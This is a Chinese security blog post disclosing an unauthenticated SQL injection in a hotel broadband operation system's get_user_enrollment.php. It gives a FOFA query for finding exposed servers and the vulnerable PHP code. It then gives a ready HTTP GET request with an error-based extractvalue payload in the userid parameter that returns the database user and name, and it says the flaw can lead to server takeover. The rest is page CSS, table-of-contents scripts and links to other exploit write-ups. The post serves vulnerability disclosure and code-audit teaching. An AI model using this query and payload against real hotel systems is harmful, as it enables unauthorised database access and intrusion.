---
title: "安美数字酒店宽带运营系统 get_user_enrollment.php SQL注入漏洞"
source: https://mrxn.net/jswz/amttgroup-get_user_enrollment-userid-sqli.html
asset_dir: assets/安美数字酒店宽带运营系统-get_user_enrollment.php-sql注入漏洞
---

# 安美数字酒店宽带运营系统 get\_user\_enrollment.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/4 18:37
* 704浏览
* [0评论](#comment)
* 26分钟阅读

深入探索

身份验证

物流软件安全

服务器安全服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

安美数字酒店宽带运营系统的 get\_user\_enrollment.php 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中的信息之外，甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入防护

# fofa语法

> `body="http://www.amttgroup.com/" && body="form.ManagerID.focus()"`

# 漏洞分析

user/portal/get\_user\_enrollment.php 和 user/get\_user\_enrollment.php 代码一致，分析其中之一就行

user/get\_user\_enrollment.php 业务逻辑如下

```
<?
        include_once ("mysql.php");
        /*
        //getUserEnrollment(0) 表示查找不到Enrollment记录
        //                                                (认证页面不做跳转动作)
        //
        //getUserEnrollment(1) 表示找到Enrollment记录，但Mac记录不存在
        //                                                (认证页面做跳转动作)
        */

        function return_res($state)
        {
                return "getUserEnrollment(".$state.")";
        }

        if (!isset($userid)) $userid = "";
        if (!isset($usermac)) $usermac = "";
        if (!isset($portaltype)) $portaltype = "";
        if (!isset($portalname)) $portalname = "";

        if (trim($userid) == ""  || trim($usermac) == "") {
                echo return_res(0);
                exit;
        }

        $db = new newDB();

        $sqlcmd = "SELECT EnrollmentID from T_MacLog where ExpireTime>'".time(0)."' and AccountID='$userid' and CheckOutFlag='0' and UserMac='$usermac'";
        $result = $db->query($sqlcmd, '0');
        if  ($result && $db->num_rows($result) > 0) {
                echo return_res(0);
                $db->close();
                exit;
        }

        $sqlcmd = "SELECT EnrollmentID from T_Enrollment where AccountID='$userid' and CheckOutFlag='0' and PortalMode='1' and ExpireTime>'".time(0)."' ";
        if (strtolower($portaltype) == "public" && strtolower($portalname) == "wlan") {
                //无线
                $sqlcmd .= "and (AllowEnetMacNum='0' or (AllowWlanMacNum>'0' and RegWlanMacNum<AllowWlanMacNum))";
        } else {
                //有线
                $sqlcmd .= "and (AllowEnetMacNum='0' or (AllowEnetMacNum>'0' and RegEnetMacNum<AllowEnetMacNum))";
        }
        $result = $db->query($sqlcmd, '0');
        if  ($result && $db->num_rows($result) > 0) {
                echo return_res(1);
        }else{
                echo return_res(0);
        }

        $db->close();
        exit;
?>
```

`$userid` 和 `$usermac` 二者均没有任何过滤校验操作，直接拼接进SQL语句中执行，造成SQL注入。

代码安全审计

只需要满足 二者不为空即可进入SQL语句查询处理处。

# 漏洞复现

```
GET /user/get_user_enrollment.php?userid=1'+and+extractvalue(1,concat(0x7e,user(),0x7e,database()))--+-&usermac=2 HTTP/1.1
Host: amttgroup.mrxn.net
```

[![安美数字酒店宽带运营系统 get_user_enrollment.php SQL注入漏洞](images/img-001-a7b80fdc2ce0.webp)](https://image.mrxn.net/1eb591aa44a940b39d54a6c70e32e23d.webp)

成功利用报错注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取到数据库用户+数据库名信息。

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[安美数字酒店宽带运营系统 get\_user\_enrollment.php SQL注入漏洞](https://mrxn.net/jswz/amttgroup-get_user_enrollment-userid-sqli.html)  
文章链接：<https://mrxn.net/jswz/amttgroup-get_user_enrollment-userid-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/amttgroup-get\_user\_enrollment-userid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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